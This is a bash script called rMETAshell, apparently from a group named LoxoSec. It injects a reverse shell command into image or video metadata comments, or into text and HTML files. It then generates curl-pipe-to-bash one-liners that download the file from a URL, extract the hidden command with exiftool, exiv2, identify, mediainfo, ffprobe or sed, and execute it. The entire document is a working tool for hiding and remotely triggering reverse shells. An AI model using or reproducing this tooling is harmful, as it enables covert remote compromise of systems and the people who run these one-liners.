#!/bin/bash
#
# From: LoxoSec with ❤️
#
# rMETAshell - A reverse shell metadata injection
# and one-liner generator tool!
#
# git5
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
# ------------------------------------------------
# X
# https://x.com/git5loxosec
# ------------------------------------------------
# Facebook
# https://www.facebook.com/profile.php?id=61551530174528
# ------------------------------------------------

show_help() {
    echo -e "\e[36mUsage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename> <URL>\e[0m"
    echo -e "\e[36mInject a reverse shell command into an image, generate a one-liner execution method, and upload the file.\e[0m"
    echo ""
    echo -e "\e[36mOptions:\e[0m"
    echo "  -h, --help           Display this help message."
    echo ""
    echo -e "\e[36mArguments:\e[0m"
    echo -e "\e[36m  <REVERSE_SHELL_COMMAND> The reverse shell command to inject.\e[0m"
    echo -e "\e[36m  <filename>            The name of the file.\e[0m"
    echo -e "\e[36m  <URL>                 The URL path to upload the file (e.g., http://www.example.com).\e[0m"
    echo ""
}

if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    show_help
    exit 0
fi

if [ $# -ne 3 ]; then
    echo -e "\e[91mError: Invalid number of arguments.\e[0m"
    show_help
    exit 1
fi

command="$1"
filename="$2"
url="$3"

if [[ "$filename" == *.txt || "$filename" == *.html || "$filename" == *.htm ]]; then
    echo -e "\e[95mInjecting reverse shell into text file...\e[0m"
    echo "'<rs>$command</rs>'" >> "$filename"
    echo -e "\e[95mText based file command injection method completed.\e[0m"
fi

exiftool -Comment="$command" "$filename"

echo -e "\e[36mImage/Video file command injection method completed.\e[0m"

echo -e "\e[36mExecution methods compatible with image file format:\e[0m"
echo "1. image-exiftool-one-liner"
echo "2. image-exiv2-one-liner"
echo "3. image-identify-one-liner"
echo "4. image-file-grep-one-liner"
echo "5. image-jpeginfo-grep-one-liner"

echo -e "\e[36mExecution methods compatible with video file format:\e[0m"
echo "6. video-exiftool-one-liner"
echo "7. video-mediainfo-one-liner"
echo "8. video-ffprobe-one-liner"

echo -e "\e[36mExecution methods compatible with text file format:\e[0m"
echo "9. text-sed-one-liner"
echo -e "\e[36mExecution method for an infected image/video saved in a zip:\e[0m"
echo "10. image/video-exiftool-zip-one-liner"
read -p "Enter the method number (1-10): " method_choice

case "$method_choice" in
    1)
        echo -e "\e[34mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    2)
        echo -e "\e[34mGenerating one-liner method with exiv2..."
        one_liner="curl -s '$url/$filename' | exiv2 -p c | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    3)
        echo -e "\e[34mGenerating one-liner method with identify..."
        one_liner="curl -s '$url/$filename' | identify -format '%c' | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    4)
        echo -e "\e[34mGenerating one-liner method with file and grep..."
        one_liner="curl -s '$url/$filename' | file - | grep -o 'comment: \".*\"' | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    5)
        echo -e "\e[34mGenerating one-liner method with jpeginfo and grep..."
        one_liner="curl -s '$url/$filename' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    6)
        echo -e "\e[34mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    7)
        echo -e "\e[34mGenerating one-liner method with mediainfo..."
        one_liner="curl -s '$url/$filename' | mediainfo --Output="General;%Comment%" | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    8)
        echo -e "\e[34mGenerating one-liner method with ffprobe..."
        one_liner="curl -s '$url/$filename' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    9)
        echo -e "\e[34mGenerating one-liner method with sed for text based files..."
        one_liner="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    10)
        echo -e "\e[34mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
        read -p "Enter the name of the file inside the ZIP archive: " filename2
        one_liner="curl -s '$url/$filename' | exiftool $filename / $filename2 -Comment -b -echo | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    *)
        echo -e "\e[91mInvalid method choice.\e[0m"
        ;;
esac
